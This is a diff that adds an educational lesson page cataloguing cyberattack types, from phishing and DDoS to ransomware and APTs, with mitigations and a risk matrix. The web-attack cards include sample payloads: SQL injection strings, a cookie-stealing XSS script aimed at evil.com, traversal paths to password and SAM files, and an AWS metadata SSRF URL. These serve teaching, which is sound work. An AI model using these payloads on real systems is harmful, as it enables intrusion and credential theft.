+                    <span class="attack-card-severity severity-badge-high">HIGH</span>
+                    <img class="attack-card-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS81LxertxMgnArMzhaD_Z4Dcqm1gFiTtb4g2M9AaCA6dpziLXTsWnUgXkK&s=10" alt="Tailgating attack showing someone following through a secured door">
+                    <p>Physically following an authorized person through a secured door or gate without using credentials. Exploits human courtesy — people rarely question someone who appears to belong.</p>
+                    <ul>
+                        <li>Following an employee through a badge-access door</li>
+                        <li>Pretending to be a delivery driver or contractor</li>
+                        <li>Countermeasure: mantraps, security awareness training</li>
+                    </ul>
+                </div>
+
+                <!-- Baiting / USB Drop -->
+                <div class="attack-card severity-high">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-orange">🗄️</div>
+                        <div class="attack-card-title">Baiting / USB Drop</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-high">HIGH</span>
+                    <img class="attack-card-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ3j69EGytbnslmshCaH6yfkJYMAq3AsajHgM29HUmHSw&s=10" alt="USB baiting attack showing infected USB drives left in a parking lot">
+                    <p>Leaving infected USB drives or other media in places where targets will find them (parking lots, lobbies, bathrooms). Curiosity drives the victim to plug it in.</p>
+                    <ul>
+                        <li>USB drive labeled "Employee Salaries 2025"</li>
+                        <li>Auto-executes malware via autorun or social engineering prompt</li>
+                        <li>Can establish reverse shell back to attacker</li>
+                    </ul>
+                </div>
+
+                <!-- Quid Pro Quo -->
+                <div class="attack-card severity-medium">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-blue">🤝</div>
+                        <div class="attack-card-title">Quid Pro Quo</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-medium">MEDIUM</span>
+                    <img class="attack-card-img" src="https://www.techslang.com/wp-content/uploads/2021/03/816-1024x536.jpg" alt="Quid pro quo attack showing exchange of benefit for information">
+                    <p>A promise of a benefit in exchange for information or access. The attacker offers something of value (a service, gift, or technical help) to manipulate the victim.</p>
+                    <ul>
+                        <li>"I'll fix your computer if you give me your password"</li>
+                        <li>Fake IT support calls offering free security scans</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- ==================== SECTION 2: NETWORK-BASED ATTACKS ==================== -->
+        <section id="network-attacks">
+            <h2 class="section-title">2. Network-Based Attacks</h2>
+            <p class="text-block">These attacks target the network infrastructure itself — routers, switches, protocols, and the data flowing through them. They can disrupt availability, intercept data, or redirect traffic.</p>
+
+            <div class="attack-grid">
+                <!-- DDoS -->
+                <div class="attack-card severity-critical">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-purple">💀</div>
+                        <div class="attack-card-title">DDoS (Distributed Denial of Service)</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-critical">CRITICAL</span>
+                    <img class="attack-card-img" src="https://www.spanning.com/blog/denial-of-service-attacks-web-based-application-security-part-7/denial-of-service-attack-example.png" alt="DDoS attack overwhelming a server with traffic from a botnet">
+                    <p>Overwhelming a target with traffic from thousands of compromised devices (botnet). The goal is to exhaust bandwidth, server resources, or application capacity.</p>
+                    <ul>
+                        <li><strong>Volumetric:</strong> UDP floods, DNS amplification, NTP amplification</li>
+                        <li><strong>Protocol:</strong> SYN floods, Ping of Death, Smurf attacks</li>
+                        <li><strong>Application layer:</strong> HTTP floods, Slowloris, Slow POST</li>
+                    </ul>
+                </div>
+
+                <!-- MITM -->
+                <div class="attack-card severity-critical">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-red">🕵️</div>
+                        <div class="attack-card-title">Man-in-the-Middle (MITM)</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-critical">CRITICAL</span>
+                    <img class="attack-card-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQf_SXqfK_lKYPeZiWMu7aOHsSiHg_Dj8SCqXmWNQbckPjli0Lp23jiQpQ&s=10" alt="Man in the middle attack intercepting data between two parties">
+                    <p>An attacker secretly intercepts and potentially alters communication between two parties who believe they are communicating directly.</p>
+                    <ul>
+                        <li><strong>ARP spoofing:</strong> Poisoning the ARP cache to redirect LAN traffic</li>
+                        <li><strong>DNS spoofing:</strong> Forcing victims to resolve domains to attacker IPs</li>
+                        <li><strong>SSL stripping:</strong> Downgrading HTTPS to HTTP to intercept traffic</li>
+                        <li><strong>WiFi Evil Twin:</strong> Rogue access point mimicking a legitimate network</li>
+                    </ul>
+                    <pre><code>Switch# show ip arp | include &lt;suspicious-mac&gt;
+Switch# show mac address-table address &lt;suspicious-mac&gt;
+Switch(config)# ip dhcp snooping vlan 1
+Switch(config)# ip dhcp snooping</code></pre>
+                </div>
+
+                <!-- DNS Spoofing -->
+                <div class="attack-card severity-high">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-orange">🌐</div>
+                        <div class="attack-card-title">DNS Spoofing / Cache Poisoning</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-high">HIGH</span>
+                    <img class="attack-card-img" src="https://cdn.prod.website-files.com/6a020fca21245d64af2c19d8/6a020fca21245d64af2c41cb_67b432ca4535ad5635f47fb1_60c35205a08c01989ab2f764_DNS%252520Spoofing.jpeg" alt="DNS cache poisoning attack redirecting a user to a malicious site">
+                    <p>Injecting falsified DNS records into a DNS resolver's cache, causing victims to be redirected to malicious websites.</p>
+                    <ul>
+                        <li>Victim types "bank.com" but resolves to attacker's IP</li>
+                        <li>Can be used to distribute malware or steal credentials</li>
+                        <li>Mitigation: DNSSEC, use trusted DNS resolvers only</li>
+                    </ul>
+                </div>
+
+                <!-- Session Hijacking -->
+                <div class="attack-card severity-high">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-orange">📡</div>
+                        <div class="attack-card-title">Session Hijacking</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-high">HIGH</span>
+                    <img class="attack-card-img" src="https://appomni.com/wp-content/uploads/2024/03/Session-Hijack-Figure@2x-1024x576-1.png" alt="Session hijacking attack stealing a session token from a user">
+                    <p>Taking over an established session after the user has authenticated. The attacker steals the session token to impersonate the user.</p>
+                    <ul>
+                        <li>Session token theft via XSS or network sniffing</li>
+                        <li>Session fixation: forcing a victim to use a known session ID</li>
+                        <li>Mitigation: HTTPS, HttpOnly cookies, session timeout</li>
+                    </ul>
+                </div>
+
+                <!-- Rogue Access Point -->
+                <div class="attack-card severity-medium">
+
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-blue">🔀</div>
+                        <div class="attack-card-title">Rogue Access Point</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-medium">MEDIUM</span>
+										<img class="attack-card-img" src="https://www.researchgate.net/publication/327264581/figure/fig1/AS:664585870786560@1535461027087/Attack-model-of-rogue-APs.png" alt="Session hijacking attack stealing a session token from a user">
+
+                    <p>An unauthorized wireless access point set up within an organization's range to intercept wireless traffic.</p>
+                    <ul>
+                        <li>Signals stronger than legitimate APs to attract clients</li>
+                        <li>All traffic routed through attacker's device</li>
+                        <li>Detection: wireless IDS, signal mapping, rogue AP detection</li>
+                    </ul>
+                </div>
+
+                <!-- VLAN Hopping -->
+                <div class="attack-card severity-high">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-orange">🚨</div>
+                        <div class="attack-card-title">VLAN Hopping</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-high">HIGH</span>
+                    <img class="attack-card-img" src="https://substackcdn.com/image/fetch/$s_!YzN1!,w_1200,h_675,c_fill,f_jpg,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fafd6e37b-3136-41d3-8a3f-01c67d2ee3f0_1080x540.png" alt="VLAN hopping attack bypassing network segmentation">
+                    <p>Bypassing VLAN segmentation to access traffic on a different VLAN using switch spoofing or double tagging.</p>
+                    <ul>
+                        <li><strong>Switch spoofing:</strong> Pretending to be a switch to negotiate a trunk</li>
+                        <li><strong>Double tagging:</strong> Outer tag stripped by first switch, inner tag forwards to target VLAN</li>
+                    </ul>
+                    <pre><code>Switch(config)# interface range gigabitEthernet 0/1-24
+Switch(config-if-range)# switchport mode access
+Switch(config-if-range)# no negotiate auto</code></pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- ==================== SECTION 3: APPLICATION & WEB ATTACKS ==================== -->
+        <section id="web-attacks">
+            <h2 class="section-title">3. Application & Web Attacks</h2>
+            <p class="text-block">These attacks exploit vulnerabilities in web applications, APIs, and software. They are among the most common attack vectors because web apps are exposed to the internet.</p>
+
+            <div class="attack-grid">
+                <!-- SQL Injection -->
+                <div class="attack-card severity-critical">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-red">💉</div>
+                        <div class="attack-card-title">SQL Injection (SQLi)</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-critical">CRITICAL</span>
+                    <img class="attack-card-img" src="https://www.spanning.com/blog/sql-injection-attacks-web-based-application-security-part-4/SQL-injection-attack-example.png" alt="SQL injection attack on a database through a web form">
+                    <p>Injecting malicious SQL code into input fields that are improperly sanitized. The attacker can read, modify, or delete database contents.</p>
+                    <ul>
+                        <li><strong>In-band:</strong> Same channel for injection and results</li>
+                        <li><strong>Blind:</strong> No direct output (boolean-based, time-based)</li>
+                        <li><strong>Out-of-band:</strong> Uses DNS/HTTP to exfiltrate data</li>
+                    </ul>
+                    <pre><code>' OR 1=1; --
+' UNION SELECT username, password FROM users --
+' OR '1'='1' --
+-- GOOD: "SELECT * FROM users WHERE id=?" (prepared)</code></pre>
+                </div>
+
+                <!-- XSS -->
+                <div class="attack-card severity-critical">
+                    <div class="attack-card-header">
+                        <div class="attack-icon icon-red" style="background:rgba(239,68,68,0.12);width:48px;height:48px;border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:1.2rem;"><code>&lt;/&gt;</div>
+                        <div class="attack-card-title">Cross-Site Scripting (XSS)</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-critical">CRITICAL</span>
+                    <img class="attack-card-img" src="https://www.spanning.com/blog/cross-site-scripting-web-based-application-security-part-3/cross-site-scripting-example.png" alt="Cross site scripting attack injecting script into a webpage">
+                    <p>Injecting malicious client-side scripts into web pages viewed by other users. The script executes in the victim's browser.</p>
+                    <ul>
+                        <li><strong>Reflected XSS:</strong> Payload in the URL, reflected back in the response</li>
+                        <li><strong>Stored XSS:</strong> Payload persisted in the database</li>
+                        <li><strong>DOM-based XSS:</strong> Payload manipulates the DOM directly</li>
+                    </ul>
+                    <pre><code>&lt;script&gt;document.location='http://evil.com/?c='+document.cookie&lt;/script&gt;
+&lt;img src=x onerror="alert('XSS')"&gt;
+-- Mitigation: output encoding, CSP headers, input validation</code></pre>
+                </div>
+
+                <!-- CSRF -->
+                <div class="attack-card severity-high">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-orange">🔄</div>
+                        <div class="attack-card-title">Cross-Site Request Forgery (CSRF)</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-high">HIGH</span>
+                    <img class="attack-card-img" src="https://www.spanning.com/blog/cross-site-forgery-web-based-application-security-part-2/cross-site-request-forgery-example.png" alt="CSRF attack tricking a user into submitting a fake request">
+                    <p>Tricking an authenticated user into unknowingly submitting a request to a web application where they are already logged in.</p>
+                    <ul>
+                        <li>A hidden form on a malicious site submits to the bank's transfer endpoint</li>
+                        <li>The victim's browser automatically sends session cookies</li>
+                        <li>Mitigation: CSRF tokens, SameSite cookie, referer checking</li>
+                    </ul>
+                </div>
+
+                <!-- Broken Authentication -->
+                <div class="attack-card severity-high">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-orange">🔓</div>
+                        <div class="attack-card-title">Broken Authentication</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-high">HIGH</span>
+                    <img class="attack-card-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcROVhexRiCqxpOy_2N8NkD9NuHWHUDmvYoDm28067aL00_MBcVJ7GQpm_g&s=10" alt="Broken authentication allowing unauthorized access to an account">
+                    <p>Exploiting weaknesses in authentication mechanisms to assume other users' identities.</p>
+                    <ul>
+                        <li><strong>Credential stuffing:</strong> Using leaked username/password pairs</li>
+                        <li><strong>Brute force:</strong> Systematically trying every possible password</li>
+                        <li><strong>Session fixation:</strong> Forcing a predetermined session ID</li>
+                    </ul>
+                </div>
+
+                <!-- Directory Traversal -->
+                <div class="attack-card severity-high">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-orange">📁</div>
+                        <div class="attack-card-title">Directory Traversal</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-high">HIGH</span>
+                    <img class="attack-card-img" src="https://cdn.prod.website-files.com/6a020fca21245d64af2c19d8/6a020fca21245d64af2c3fe0_67b4314e84d1854611ff5494_6255a39a3945c916f6685f36_path%252520traversal%252520example.jpeg" alt="Directory traversal attack navigating through filesystem folders">
+                    <p>Exploiting insufficient input validation to access files outside the intended folder using dot-dot-slash sequences.</p>
+                    <ul>
+                        <li><span class="inline-code">../../../../etc/passwd</span></li>
+                        <li><span class="inline-code">....//....//windows/system32/config/sam</span></li>
+                        <li>Mitigation: input validation, chroot, allowlist paths</li>
+                    </ul>
+                </div>
+
+                <!-- SSRF -->
+                <div class="attack-card severity-medium">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-blue">🔗</div>
+                        <div class="attack-card-title">SSRF (Server-Side Request Forgery)</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-medium">MEDIUM</span>
+                    <img class="attack-card-img" src="https://media.licdn.com/dms/image/v2/D5612AQGX_kATcFDt1Q/article-cover_image-shrink_600_2000/article-cover_image-shrink_600_2000/0/1682116408672?e=2147483647&v=beta&t=ZwJDazWgFG_Z2MVjxtuqX8-m3Inm6WgDpdD51G25sG4" alt="SSRF attack forcing a server to make requests to internal resources">
+                    <p>Forcing a server to make HTTP requests to an arbitrary domain/IP chosen by the attacker.</p>
+                    <ul>
+                        <li><span class="inline-code">?url=http://169.254.169.254/latest/meta-data/</span> (AWS metadata)</li>
+                        <li>Can access internal services not exposed to the internet</li>
+                        <li>Mitigation: URL allowlists, disable unnecessary outbound HTTP</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- ==================== SECTION 4: MALWARE-BASED ATTACKS ==================== -->
+        <section id="malware-attacks">
+            <h2 class="section-title">4. Malware-Based Attacks</h2>
+            <p class="text-block">Malware (malicious software) is any software intentionally designed to cause damage. Malware comes in many forms, each with distinct behaviors and objectives.</p>
+
+            <div class="attack-grid">
+                <!-- Ransomware -->
+                <div class="attack-card severity-critical">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-red">🔒</div>
+                        <div class="attack-card-title">Ransomware</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-critical">CRITICAL</span>
+                    <img class="attack-card-img" src="https://cdn.prod.website-files.com/6a020fca21245d64af2c19d8/6a020fca21245d64af2c2e62_Ransomware%20Attack%20preview.png" alt="Ransomware lock screen demanding payment to decrypt files">
+                    <p>Encrypts the victim's files or locks the entire system, then demands payment for the decryption key. Modern ransomware also exfiltrates data for double extortion.</p>
+                    <ul>
+                        <li><strong>Encrypting:</strong> Locky, Ryuk, LockBit, BlackCat/ALPHV</li>
+                        <li><strong>Locker:</strong> Winlocker (locks the screen, doesn't encrypt)</li>
+                       ><li><strong>RaaS:</strong> Ransomware-as-a-Service affiliate model</li>
+                    </ul>
+                </div>
+
+                <!-- Trojans / RATs -->
+                <div class="attack-card severity-critical">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-red">🦠</div>
+                        <div class="attack-card-title">Trojans / Remote Access Trojans (RATs)</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-critical">CRITICAL</span>
+                    <img class="attack-card-img" src="https://cdn.prod.website-files.com/6a020fca21245d64af2c19d8/6a020fca21245d64af2c3033_Trojans%20Preview.png
+" alt="Trojan horse malware disguised as legitimate software">
+                    <p>Malware disguised as legitimate software that creates a backdoor. RATs provide full remote control over the compromised machine.</p>
+                    <ul>
+                        <li>Common RATs: DarkComet, njRAT, Cobalt Strike Beacon</li>
+                        <li>Distributed via phishing, fake downloads, USB drops</li>
+                        <li>Persists via registry run keys, scheduled tasks</li>
+                    </ul>
+                </div>
+
+                <!-- Worms -->
+                <div class="attack-card severity-high">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-orange">🪱</div>
+                        <div class="attack-card-title">Worms</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-high">HIGH</span>
+                    <img class="attack-card-img" src="https://www.adlice.com/wp-content/uploads/2020/07/worms_tech.jpg" alt="Computer worm spreading across a network">
+                    <p>Self-replicating malware that spreads without user interaction by exploiting network vulnerabilities.</p>
+                    <ul>
+                        <li>Exploits unpatched services (SMB, RDP, email)</li>
+                        <li>Historical: ILOVEYOU, Conficker, WannaCry</li>
+                        <li>Can spread across entire networks in minutes</li>
+                    </ul>
+                </div>
+
+                <!-- Spyware / Adware -->
+                <div class="attack-card severity-high">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-orange">📢</div>
+                        <div class="attack-card-title">Spyware / Adware</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-high">HIGH</span>
+                    <img class="attack-card-img" src="https://i.ytimg.com/vi/M-BeGyZlsco/maxresdefault.jpg" alt="Spyware covertly monitoring a user's computer screen and keystrokes">
+                    <p>Covertly monitors user activity (spyware) or displays unwanted advertisements (adware).</p>
+                    <ul>
+                        <li><strong>Keyloggers:</strong> Record every keystroke to capture passwords</li>
+                        <li><strong>Screen scrapers:</strong> Periodically capture screenshots</li>
+                        <li><strong>Info-stealers:</strong> Collect cookies, passwords, crypto wallets</li>
+                    </ul>
+                </div>
+
+                <!-- Rootkits -->
+                <div class="attack-card severity-medium">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-blue">🏗️</div>
+                        <div class="attack-card-title">Rootkits</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-medium">MEDIUM</span>
+                    <img class="attack-card-img" src="https://picsum.photos/70/rootkit-hidden-processes/640/180" alt="Rootkit hiding processes from the operating system">
+                    <p>Stealthy malware that modifies the OS kernel or low-level components to hide its presence from security tools.</p>
+                    <ul>
+                        <li><strong>User-mode:</strong> Hooks API calls to hide activity</li>
+                        <li><strong>Kernel-mode:</strong> Modifies the OS kernel itself</li>
+                        <li><strong>Bootkit:</strong> Infects the Master Boot Record (MBR)</li>
+                        <li>Detection: memory analysis, boot-time scanning</li>
+                    </ul>
+                </div>
+
+                <!-- Crypto Mining Malware -->
+                <div class="attack-card severity-high">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-orange">💰</div>
+                        <div class="attack-card-title">Cryptocurrency Mining Malware</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-high">HIGH</span>
+                    <img class="attack-card-img" src="https://picsum.photos/70/crypto-mining-gpu/640/180" alt="Cryptocurrency mining malware consuming GPU resources on a compromised machine">
+                    <p>Installs cryptocurrency miners on victim machines without consent, consuming CPU/GPU resources.</p>
+                    <ul>
+                        <li>Delivered via phishing, drive-by downloads, compromised containers</li>
+                        <li>Often targets cloud environments</li>
+                        <li>Detection: abnormal CPU usage, mining pool connections</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- ==================== SECTION 5: ADVANCED & PERSISTENT THREATS ==================== -->
+        <section id="apt-attacks">
+            <h2 class="section-title">5. Advanced & Persistent Threats</h2>
+            <p class="text-block">Sophisticated, long-term attack campaigns orchestrated by nation-state actors or well-funded cybercriminal groups. They use multiple vectors simultaneously and maintain persistent access over months or years.</p>
+
+            <div class="attack-grid">
+                <!-- APT -->
+                <div class="attack-card severity-critical">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-red">🏛️</div>
+                        <div class="attack-card-title">APT (Advanced Persistent Threat)</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-critical">CRITICAL</span>
+                    <img class="attack-card-img" src="https://picsum.photos/70/apt-cyber-operation/640/180" alt="Advanced persistent threat operation targeting an organization">
+                    <p>Prolonged, targeted cyberattack in which an attacker gains access to a network and remains undetected for an extended period.</p>
+                    <ul>
+                        <li>Known APT groups: APT29 (Cozy Bear), APT28 (Fancy Bear), Lazarus</li>
+                        <li>Kill chain: Recon → Weaponize → Deliver → Exploit → Install → C2 → Act</li>
+                        <li>Focus: intellectual property, state secrets, critical infrastructure</li>
+                    </ul>
+                </div>
+
+                <!-- Zero-Day -->
+                <div class="attack-card severity-critical">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-red" style="background:rgba(239,68,68,0.12);width:48px;height:48px;border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:1.1rem;font-weight:800;">0DAY</div>
+                        <div class="attack-card-title">Zero-Day Exploits</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-critical">CRITICAL</span>
+                    <img class="attack-card-img" src="https://picsum.photos/70/zero-day-exploit/640/180" alt="Zero day exploit being discovered in software code">
+                    <p>Exploiting a software vulnerability unknown to the vendor with no patch available. Zero-day exploits can sell for $100K-$2M+.</p>
+                    <ul>
+                        <li>Used heavily in APT campaigns and targeted attacks</li>
+                        <li>Can be in OS, browsers, firmware, or ICS software</li>
+                        <li>Mitigation: defense-in-depth, behavior detection</li>
+                    </ul>
+                </div>
+
+                <!-- Supply Chain -->
+                <div class="attack-card severity-high">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-orange">🎯</div>
+                        <div class="attack-card-title">Supply Chain Attack</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-high">HIGH</span>
+                    <img class="attack-card-img" src="https://picsum.photos/70/supply-chain-compromised/640/180" alt="Supply chain attack compromising a trusted software vendor">
+                    <p>Compromising a trusted third-party supplier to distribute malware through legitimate update channels.</p>
+                    <ul>
+                        <li><strong>SolarWinds (2020):</strong> Malicious code in Orion platform updates</li>
+                        <li><strong>Codecov (2021):</strong> Compromised bash uploader script</li>
+                        <li><strong>3CX (2023):</strong> Trojanized desktop app update</li>
+                    </ul>
+                </div>
+
+                <!-- Polymorphic Malware -->
+                <div class="attack-card severity-high">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-orange">🔄</div>
+                        <div class="attack-card-title">Polymorphic / Metamorphic Malware</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-high">HIGH</span>
+                    <img class="attack-card-img" src="https://picsum.photos/70/polymorphic-mutation/640/180" alt="Polymorphic malware changing its code signature to avoid detection">
+                    <p>Malware that changes its code signature every time it replicates, making it invisible to signature-based antivirus detection.</p>
+                    <ul>
+                        <li>Each infected file has a unique signature</li>
+                        <li>Requires behavior-based or heuristic detection</li>
+                        <li>Often used as the first stage in APT payloads</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- ==================== SECTION 6: RISK MATRICES ==================== -->
+        <section id="risk-matrices">
+            <h2 class="section-title">6. Risk Assessment Matrices</h2>
+            <p class="text-block">Risk matrices help security teams prioritize which threats to address first based on <strong>likelihood</strong> and <strong>impact</strong>. Not all attacks require the same level of investment in defenses.</p>
+
+            <figure class="large-figure">
+                <img src="https://z-cdn-media.chatglm.cn/files/d5865b06-7a16-4c45-9eb5-f375784094cd.png?auth_key=1886267490-3e5e44d0cc404d2da86292cc8c4b4b5a-0-63ba7f6aa7ef0ec55c5e9e9c91f9bf06" alt="5x5 Risk Matrix with Likelihood vs Impact">
+                <figcaption><strong>Figure 1: 5x5 Risk Matrix</strong> — Threats in the "Act Fast" zone (high likelihood + high impact) require immediate mitigation. "Manage" zone threats need planned controls. "Monitor" zone threats are tracked but may not need active investment.</figcaption>
+            </figure>
+
+            <figure class="large-figure">
+                <img src="https://z-cdn-media.chatglm.cn/files/38edf023-389e-4111-b54d-0f3dc70ac7d4.png?auth_key=1886267490-dfa30c08a5d14e16b8210adcd3c0f1ea-0-ba6ca07e4f81f3b25d6ac8a3dcd82ad3" alt="4-Quadrant Risk Matrix with probability vs impact zones A B C D">
+                <figcaption><strong>Figure 2: 4-Quadrant Risk Matrix</strong> — Zone B (high probability + high impact) is most dangerous. Zone D (low probability + high impact) represents "black swan" events needing contingency plans. Zone A is a maintenance burden. Zone C is low priority.</figcaption>
+            </figure>
+
+            <div class="attack-table-wrap">
+                <table class="attack-table">
+                    <thead>
+                        <tr><th>Attack Type</th><th>Likelihood</th><th>Impact</th><th>Risk Zone</th><th>Priority Action</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><strong>Phishing</strong></td><td style="color:var(--danger);font-weight:700;">Very High</td><td style="color:var(--danger);font-weight:700;">Critical</td><td><span style="background:rgba(239,68,68,0.15);color:var(--danger);padding:2px 10px;border-radius:6px;font-size:0.75rem;font-weight:700;">ACT FAST</span></td><td>Security awareness training, email filtering, MFA</td></tr>
+                        <tr><td><strong>Ransomware</strong></td><td style="color:var(--warning);font-weight:700;">High</td><td style="color:var(--danger);font-weight:700;">Critical</td><td><span style="background:rgba(239,68,68,0.15);color:var(--danger);padding:2px 10px;border-radius:6px;font-size:0.75rem;font-weight:700;">ACT FAST</span></td><td>Offline backups, EDR, segmentation, IR plan</td></tr>
+                        <tr><td><strong>SQL Injection</strong></td><td style="color:var(--warning);font-weight:700;">High</td><td style="color:var(--warning);font-weight:700;">High</td><td><span style="background:rgba(255,152,0,0.15);color:var(--warning);padding:2px 10px;border-radius:6px;font-size:0.75rem;font-weight:700;">MANAGE</span></td><td>Parameterized queries, WAF, SAST/DAST</td></tr>
+                        <tr><td><strong>DDoS</strong></td><td style="color:var(--danger);font-weight:700;">Very High</td><td style="color:var(--warning);font-weight:700;">High</td><td><span style="background:rgba(239,68,68,0.15);color:var(--danger);padding:2px 10px;border-radius:6px;font-size:0.75rem;font-weight:700;">ACT FAST</span></td><td>DDoS mitigation service, rate limiting, CDN</td></tr>
+                        <tr><td><strong>MITM</strong></td><td style="color:var(--warning);font-weight:700;">Medium</td><td style="color:var(--danger);font-weight:700;">Critical</td><td><span style="background:rgba(255,152,0,0.15);color:var(--warning);padding:2px 10px;border-radius:6px;font-size:0.75rem;font-weight:700;">MANAGE</span></td>HTTPS everywhere, cert pinning, VPN</td></tr>
+                        <tr><td><strong>Zero-Day</strong></td><td style="color:var(--success);font-weight:700;">Low</td><td style="color:var(--danger);font-weight:700;">Critical</td><td><span style="background:rgba(255,152,0,0.15);color:var(--warning);padding:2px 10px;border-radius:6px;font-size:0.75rem;font-weight:700;">MANAGE</span></td>Defense-in-depth, behavior detection, rapid patching</td></tr>
+                        <tr><td><strong>Supply Chain</strong></td><td style="color:var(--success);font-weight:700;">Low</td><td style="color:var(--danger);font-weight:700;">Critical</td><td><span style="background:rgba(255,152,0,0.15);color:var(--warning);padding:2px 10px;border-radius:6px;font-size:0.75rem;font-weight:700;">MANAGE</span></td>Vendor risk assessment, SBOM, integrity verification</td></tr>
+                        <tr><td><strong>Tailgating</strong></td><td style="color:var(--warning);font-weight:700;">Medium</td><td style="color:var(--info);font-weight:700;">Medium</td><td><span style="background:rgba(41,182,246,0.15);color:var(--info);padding:2px 10px;border-radius:6px;font-size:0.75rem;font-weight:700;">MONITOR</span></td>Mantraps, badge readers, CCTV</td></tr>
+                        <tr><td><strong>Quid Pro Quo</strong></td><td style="color:var(--info);font-weight:700;">Low</td><td style="color:var(--info);font-weight:700;">Medium</td><td><span style="background:rgba(0,230,118,0.15);color:var(--success);padding:2px 10px;border-radius:6px;font-size:0.75rem;font-weight:700;">MONITOR</span></td>Security awareness training, verification procedures</td></tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <div class="alert-info-custom">
+                <h4><i class="fas fa-lightbulb"></i> How to Use These Matrices</h4>
+                <ul>
+                    <li><strong>Act Fast (Red Zone):</strong> These are your immediate priorities. Allocate budget, staff, and tools here first.</li>
+                    <li><strong>Manage (Yellow Zone):</strong> Implement controls within a planned timeline. These may not be imminent but would cause significant damage.</li>
+                    <li><strong>Monitor (Green Zone):</strong> Track through threat intelligence feeds. Don't over-invest, but have a response plan ready.</li>
+                </ul>
             </div>
         </section>
 
         <!-- PREVIOUS / NEXT BUTTONS -->
         <div class="lesson-nav">
-            <a href="#" class="nav-btn prev">
-                <i class="fas fa-arrow-left"></i> Previous
-            </a>
-            <a href="#" class="nav-btn next">
-                Next <i class="fas fa-arrow-right"></i>
-            </a>
+            <a href="lesson-8.html" class="nav-btn prev"><i class="fas fa-arrow-left"></i> Previous</a>
+            <a href="lesson-10.html" class="nav-btn next">Next <i class="fas fa-right"></i></a>
         </div>
     </div>
 </div>
@@ -313,61 +796,21 @@
     <div class="footer-bottom">© CyberDefend Academy · Part of Accenture</div>
 </footer>
 
-<!-- AUTOMATE PREV / NEXT BUTTONS SCRIPT -->
 <script>
-    // 1. DEFINE YOUR LESSON ORDER HERE (Must match the sidebar exactly)
     const lessons = [
-        "network-security.html",
-        "network-roadmap.html",
-        "security-roadmap.html",
-        "labs.html",
-        "lesson-3.html",
-        "lesson-4.html",
-        "nessus.html",
-        "ids-ips.html",
-        "snort-suricata.html",
-        "dmz.html",
-        "nat.html",
-        "vpn.html",
-        "kali-tools.html",
-        "lesson-6.html",
-        "lesson-7.html",
-        "lesson-8.html",
-        "lesson-9.html",
-        "lesson-10.html",
-        "lesson-11.html",
-        "lesson-12.html",
-        "lesson-13.html",
-        "lesson-14.html",
-        "lesson-15.html",
-        "lesson-16.html",
-        "lesson-17.html",
-        "lesson-18.html"
+        "labs.html","network-roadmap.html","security-roadmap.html","lesson-6.html","lesson-7.html",
+        "lesson-3.html","kali-tools.html","lesson-4.html","nessus.html","labs2.html","lesson-8.html",
+        "lesson-9.html","lesson-10.html","lesson-11.html","lesson-12.html","lesson-13.html"
     ];
-
-    // 2. Get current page filename
